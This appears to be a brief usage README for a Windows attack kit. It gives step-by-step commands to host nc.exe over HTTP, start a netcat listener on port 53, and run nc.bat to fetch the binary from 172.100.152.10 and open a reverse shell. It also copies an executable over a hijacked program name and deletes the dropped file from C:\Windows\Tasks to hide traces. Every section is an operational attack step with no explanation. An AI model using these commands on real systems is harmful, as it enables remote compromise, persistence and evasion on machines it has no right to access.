# How To Use
## Serve nc.exe
```
python3 -m http.server -d . ^&
```
## Listen for shell
```
nc -lvnp 53
```
## Run nc.bat
```
.\nc.bat http://172.100.152.10:8000/nc.exe 172.100.152.10 53
```
## Hijack executable
```
copy x.exe HIJACKED.exe
```
## Clean-up after
```
del C:\Windows\Tasks\nc.exe
```
